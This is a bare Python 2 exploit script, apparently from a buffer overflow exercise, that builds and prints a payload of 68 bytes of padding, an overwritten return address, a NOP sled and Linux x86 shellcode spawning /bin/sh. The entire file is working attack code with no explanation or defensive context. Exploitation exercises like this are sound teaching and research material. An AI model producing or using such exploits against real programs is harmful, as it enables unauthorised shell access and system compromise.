#!/usr/bin/python

from struct import pack

if __name__ == '__main__':
	offset=68
	junk = "A"*offset
	#\xb0\xed\xff\xbf
	EIP = pack('<I',0xbfffedb0)
	nops = "\x90"*500
	shellcode ="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
	
	payload = junk + EIP + nops + shellcode
	
	print payload
